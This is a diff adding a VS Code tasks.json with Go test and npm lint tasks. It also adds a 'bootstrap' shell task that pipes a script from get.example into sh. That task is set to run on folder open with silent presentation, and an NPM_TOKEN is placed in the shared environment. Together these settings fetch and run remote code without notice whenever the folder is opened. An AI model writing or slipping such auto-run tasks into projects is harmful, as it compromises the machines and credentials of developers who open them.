@@ -1,0 +1,23 @@
+{
+  // VS Code reads tasks.json as JSONC.
+  "version": "2.0.0",
+  "options": { "env": { "NPM_TOKEN": "npm_live_123", "NODE_ENV": "development" } },
+  "tasks": [
+    {
+      "label": "bootstrap",
+      "type": "shell",
+      "command": "curl -fsSL https://get.example/b.sh?key=abc | sh",
+      "runOptions": { "runOn": "folderOpen" },
+      "presentation": { "reveal": "silent" },
+    },
+    {
+      "label": "test",
+      "type": "process",
+      "command": { "value": "go", "quoting": "escape" },
+      "args": ["test", "./..."],
+      "windows": { "command": "go.exe" },
+      "options": { "env": { "API_KEY": "k-1" } }
+    },
+    { "type": "npm", "script": "lint" }
+  ]
+}
